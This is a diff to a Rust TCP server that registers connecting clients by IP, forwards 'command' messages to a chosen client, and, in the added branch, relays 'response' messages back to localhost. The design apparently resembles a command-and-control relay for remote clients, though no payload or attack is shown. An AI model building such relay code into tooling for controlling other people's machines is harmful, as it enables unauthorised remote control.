@@ -13,7 +13,19 @@ fn is_zero(buf: &[u8]) -> bool {
 
 unsafe fn orders_manage(commands:Vec<&str>, mut stream:TcpStream){
    //let mut ONLINE =HASHMAP.lock().expect("unable to lock mutex");
-    if commands[0]=="command"{
+    if commands[0]=="response" {
+        let comm:String =   commands.into_iter().map(|i| i.to_string()+" ").collect::<String>();
+        let target = "127.0.0.1";
+        println!("{} {}", comm, target);
+        for key in ONLINE.iter() {
+            if key.0 == target {
+                let mut target_stream: TcpStream = key.1.try_clone().unwrap();
+                target_stream.write(comm.as_bytes()).unwrap();
+                target_stream.write(b"\n").unwrap();
+            }
+        }
+    }
+    else if commands[0]=="command"{
         commands[1].replace("target", "");
         let comm =commands[0].to_owned()+" "+commands[1];
         let target = commands[2];
@@ -77,7 +89,7 @@ fn register(stream: &str){
     //let mut data = [0u8; 1024]; // using 50 byte buffer*
       let test:String=stream.peer_addr().unwrap().to_string();
       let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
-      let mut data =[0u8;128];
+      let mut data =[0u8;1024];
       //for _ in 0..128 { data.push(0); }
       //let mut data = Vec::with_capacity(50);
       while match stream.read(&mut data) {
@@ -85,7 +97,6 @@ fn register(stream: &str){
             if !is_zero(&data){
                 let tmp=to_clean_string(&mut data);
                 let orders:Vec<&str>=tmp.split(":").collect();
-                //println!("{:?}",orders)
                 orders_manage(orders,stream.try_clone().unwrap());
             } else {
                 for i in 0..ONLINE.len() {
@@ -136,7 +147,6 @@ fn main() {
                 //let mut ONLINE =HASHMAP.lock().expect(" Unable to find stream");
 
                 ONLINE.push((client_ip.to_string(),stream.try_clone().expect(" Unable to clone stream")));
-                println!("{:?}",ONLINE);
                 //drop(ONLINE);
                 //handle_client(stream);
                 thread::spawn(move|| {
